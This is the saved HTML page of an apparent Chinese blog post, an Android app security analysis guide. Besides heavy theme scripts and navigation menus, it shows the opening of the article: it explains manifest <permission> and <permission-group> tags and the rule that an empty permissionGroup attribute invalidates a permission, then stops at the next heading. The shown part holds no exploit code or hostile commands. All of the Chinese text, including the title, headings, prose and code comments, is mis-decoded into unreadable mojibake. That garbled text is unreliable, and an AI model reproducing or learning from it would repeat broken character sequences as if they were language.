<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><div id="myscoll"></div><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Appå®‰å…¨åˆ†ææŒ‡å— | zxk1ngğŸ“</title><meta name="keywords" content="Androidå®‰å…¨,å®‰å…¨æµ‹è¯•,æ¼æ´"><meta name="author" content="zxk1ng"><meta name="copyright" content="zxk1ng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="ğŸ…å¯¹ç½‘ä¸Šä¸€äº›å…³äºç§»åŠ¨å®‰å…¨æµ‹è¯•æ–‡ç« çš„æ•´ç†ä¸å½’çº³">
<meta property="og:type" content="article">
<meta property="og:title" content="Appå®‰å…¨åˆ†ææŒ‡å—">
<meta property="og:url" content="https://zxk1ng.github.io/posts/f416437f.html">
<meta property="og:site_name" content="zxk1ngğŸ“">
<meta property="og:description" content="ğŸ…å¯¹ç½‘ä¸Šä¸€äº›å…³äºç§»åŠ¨å®‰å…¨æµ‹è¯•æ–‡ç« çš„æ•´ç†ä¸å½’çº³">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://api.yimian.xyz/img?type=moe&size=1920x1080">
<meta property="article:published_time" content="2025-01-15T06:38:47.000Z">
<meta property="article:modified_time" content="2025-01-15T07:14:39.056Z">
<meta property="article:author" content="zxk1ng">
<meta property="article:tag" content="Androidå®‰å…¨">
<meta property="article:tag" content="å®‰å…¨æµ‹è¯•">
<meta property="article:tag" content="æ¼æ´">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://api.yimian.xyz/img?type=moe&size=1920x1080"><link rel="shortcut icon" href="/"><link rel="canonical" href="https://zxk1ng.github.io/posts/f416437f"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: {"limitCount":50,"languages":{"author":"ä½œè€…: zxk1ng","link":"é“¾æ¥: ","source":"æ¥æº: zxk1ngğŸ“","info":"è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.js',
      css: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Appå®‰å…¨åˆ†ææŒ‡å—',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-01-15 15:14:39'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn1.tianli0.top/npm/element-ui@2.15.6/packages/theme-chalk/lib/index.css"><style id="themeColor"></style><style id="rightSide"></style><style id="transPercent"></style><style id="blurNum"></style><style id="settingStyle"></style><span id="fps"></span><style id="defineBg"></style><style id="menu_shadow"></style><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="zxk1ngğŸ“" type="application/atom+xml">
</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/img.png" onerror="onerror=null;src='/assets/r1.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-home"></use></svg><span class="menu_word" style="font-size:17px"> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--article"></use></svg><span class="menu_word" style="font-size:17px"> æ–‡ç« </span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang1">                   </use></svg><span class="menu_word" style="font-size:17px"> å½’æ¡£</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-sekuaibiaoqian">                   </use></svg><span class="menu_word" style="font-size:17px"> æ ‡ç­¾</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-fenlei">                   </use></svg><span class="menu_word" style="font-size:17px"> åˆ†ç±»</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiangzi"></use></svg><span class="menu_word" style="font-size:17px"> å…«å®ç®±</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/box/nav/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifengche">                   </use></svg><span class="menu_word" style="font-size:17px"> ç½‘å€å¯¼èˆª</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shejiaoxinxi"></use></svg><span class="menu_word" style="font-size:17px"> ç¤¾äº¤</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-liuyan">                   </use></svg><span class="menu_word" style="font-size:17px"> ç•™è¨€æ¿</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/social/link/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-lianjie">                   </use></svg><span class="menu_word" style="font-size:17px"> å‹äººå¸</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-wangye"></use></svg><span class="menu_word" style="font-size:17px"> ç½‘ç«™</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/site/echarts/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shujutongji1">                   </use></svg><span class="menu_word" style="font-size:17px"> æ–‡ç« ç»Ÿè®¡</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-maoliang"></use></svg><span class="menu_word" style="font-size:17px"> ä¸ªäºº</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/personal/bb/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-qunliaotian">                   </use></svg><span class="menu_word" style="font-size:17px"> å” å¨</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/about/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-paperplane">                   </use></svg><span class="menu_word" style="font-size:17px"> å…³äº</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zxk1ngğŸ“</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-home"></use></svg><span class="menu_word" style="font-size:17px"> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--article"></use></svg><span class="menu_word" style="font-size:17px"> æ–‡ç« </span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang1">                   </use></svg><span class="menu_word" style="font-size:17px"> å½’æ¡£</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-sekuaibiaoqian">                   </use></svg><span class="menu_word" style="font-size:17px"> æ ‡ç­¾</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-fenlei">                   </use></svg><span class="menu_word" style="font-size:17px"> åˆ†ç±»</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiangzi"></use></svg><span class="menu_word" style="font-size:17px"> å…«å®ç®±</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/box/nav/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifengche">                   </use></svg><span class="menu_word" style="font-size:17px"> ç½‘å€å¯¼èˆª</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shejiaoxinxi"></use></svg><span class="menu_word" style="font-size:17px"> ç¤¾äº¤</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-liuyan">                   </use></svg><span class="menu_word" style="font-size:17px"> ç•™è¨€æ¿</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/social/link/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-lianjie">                   </use></svg><span class="menu_word" style="font-size:17px"> å‹äººå¸</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-wangye"></use></svg><span class="menu_word" style="font-size:17px"> ç½‘ç«™</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/site/echarts/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shujutongji1">                   </use></svg><span class="menu_word" style="font-size:17px"> æ–‡ç« ç»Ÿè®¡</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-maoliang"></use></svg><span class="menu_word" style="font-size:17px"> ä¸ªäºº</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/personal/bb/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-qunliaotian">                   </use></svg><span class="menu_word" style="font-size:17px"> å” å¨</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/about/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-paperplane">                   </use></svg><span class="menu_word" style="font-size:17px"> å…³äº</span></a></li></ul></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="search faa-parent animated-hover" title="æ£€ç´¢ç«™å†…ä»»ä½•ä½ æƒ³è¦çš„ä¿¡æ¯"><svg class="faa-tada icon" style="height:24px;width:24px;fill:currentColor;position:relative;top:6px" aria-hidden="true"><use xlink:href="#icon-valentine_-search-love-find-heart"></use></svg><span> æœç´¢</span></a></div><a class="meihua faa-parent animated-hover" onclick="toggleWinbox()" title="ç¾åŒ–è®¾ç½®-è‡ªå®šä¹‰ä½ çš„é£æ ¼" id="meihua-button"><svg class="faa-tada icon" style="height:26px;width:26px;fill:currentColor;position:relative;top:8px" aria-hidden="true"><use xlink:href="#icon-tupian1"></use></svg></a><a class="sun_moon faa-parent animated-hover" onclick="switchNightMode()" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢" id="nightmode-button"><svg class="faa-tada" style="height:25px;width:25px;fill:currentColor;position:relative;top:7px" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon">       </use></svg></a><div id="toggle-menu"><a><i class="fas fa-bars fa-fw"></i></a></div></div></div></nav><div id="post-info"><h1 class="post-title">Appå®‰å…¨åˆ†ææŒ‡å—</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><svg class="meta_icon post-meta-icon" style="width:30px;height:30px;position:relative;top:10px"><use xlink:href="#icon-rili"></use></svg><span class="post-meta-label">å‘è¡¨äº </span><time class="post-meta-date-created" datetime="2025-01-15T06:38:47.000Z" title="å‘è¡¨äº 2025-01-15 14:38:47">2025-01-15</time><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-gengxin1"></use></svg><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-01-15T07:14:39.056Z" title="æ›´æ–°äº 2025-01-15 15:14:39">2025-01-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-biaoqian"></use></svg><a class="post-meta-categories" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">ç§»åŠ¨å®‰å…¨</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:8px"><use xlink:href="#icon-charuword"></use></svg><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">3.3w</span><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:20px;height:20px;position:relative;top:5px"><use xlink:href="#icon-shizhong"></use></svg><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>122åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Appå®‰å…¨åˆ†ææŒ‡å—"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:5px"><use xlink:href="#icon-eye"></use></svg><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>APPå®‰å…¨åˆ†æ</h1>
<h2 id="manifestæ–‡ä»¶æ£€æµ‹">manifestæ–‡ä»¶æ£€æµ‹</h2>
<h3 id="PermissionGroupæ£€æµ‹">PermissionGroupæ£€æµ‹</h3>
<p><strong>permissionæ ‡ç­¾</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission</span> <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:permissionGroup</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:protectionLevel</span>=<span class="string">[</span>&quot;<span class="attr">normal</span>&quot; | &quot;<span class="attr">dangerous</span>&quot; |</span></span><br><span class="line"><span class="tag">                                     &quot;<span class="attr">signature</span>&quot; | <span class="attr">...</span>] /&gt;</span></span><br><span class="line"></span><br><span class="line">//android:name ï¼šç”¨äºåœ¨ä»£ç ä¸­ï¼ˆä¾‹å¦‚ï¼Œåœ¨ <span class="tag">&lt;<span class="name">uses-permission</span>&gt;</span> å…ƒç´ æˆ–åº”ç”¨ç»„ä»¶çš„ permission å±æ€§ä¸­ï¼‰å¼•ç”¨æƒé™çš„åç§°</span><br><span class="line">    </span><br><span class="line">//android:permissionGroup : å°†æ­¤æƒé™åˆ†é…ç»™ä¸€ä¸ªç»„ã€‚æ­¤å±æ€§çš„å€¼æ˜¯è¯¥ç»„çš„åç§°ï¼Œä½¿ç”¨æ­¤åº”ç”¨æˆ–å…¶ä»–åº”ç”¨ä¸­çš„ <span class="tag">&lt;<span class="name">permission-group</span>&gt;</span> å…ƒç´ å£°æ˜ã€‚å¦‚æœæœªè®¾ç½®æ­¤å±æ€§ï¼Œåˆ™æ­¤æƒé™ä¸ä¼šå±äºæŸä¸ªç»„ã€‚</span><br></pre></td></tr></table></figure>
<p>ç”¨æ³•ï¼šå£°æ˜å¯¹äºé™åˆ¶å¯¹æ­¤åº”ç”¨æˆ–å…¶ä»–åº”ç”¨çš„ç‰¹å®šç»„ä»¶æˆ–åŠŸèƒ½çš„è®¿é—®æƒé™çš„å®‰å…¨æƒé™ã€‚</p>
<p><strong>permission-groupæ ‡ç­¾</strong></p>
<p>å£°æ˜ç›¸å…³æƒé™çš„é€»è¾‘åˆ†ç»„çš„åç§°ã€‚å„ä¸ªæƒé™é€šè¿‡ <code>&lt;permission&gt;</code> å…ƒç´ çš„ <code>permissionGroup</code> å±æ€§åŠ å…¥æƒé™ç»„ä¸­</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission-group</span> <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">// android:name : æƒé™ç»„çš„åç§°ã€‚è¿™æ˜¯å¯ä»¥åˆ†é…ç»™<span class="tag">&lt;<span class="name">permission</span>&gt;</span>å…ƒç´ çš„android:permissionGroupå±æ€§çš„åç§°</span><br></pre></td></tr></table></figure>
<p>å¦‚æœåœ¨<code>&lt;permission&gt;</code>æ ‡ç­¾æœ‰permissionGroupå±æ€§ï¼Œé‚£ä¹ˆå€¼åº”è¯¥ä¸ä¸ºç©ºã€‚å¦‚æœpermissionGroupçš„å±æ€§ä¸ºç©ºï¼Œä¼šå¯¼è‡´æƒé™å®šä¹‰æ— æ•ˆï¼Œä¸”å…¶ä»–appæ— æ³•ä½¿ç”¨è¯¥æƒé™ã€‚</p>
<h3 id="AndroidManifestæ–‡ä»¶ä¸­ç³»ç»Ÿæƒé™ä½¿ç”¨æ£€æµ‹"><strong>AndroidManifestæ–‡ä»¶ä¸­ç³»ç»Ÿæƒé™ä½¿ç”¨æ£€æµ‹</strong></h3>
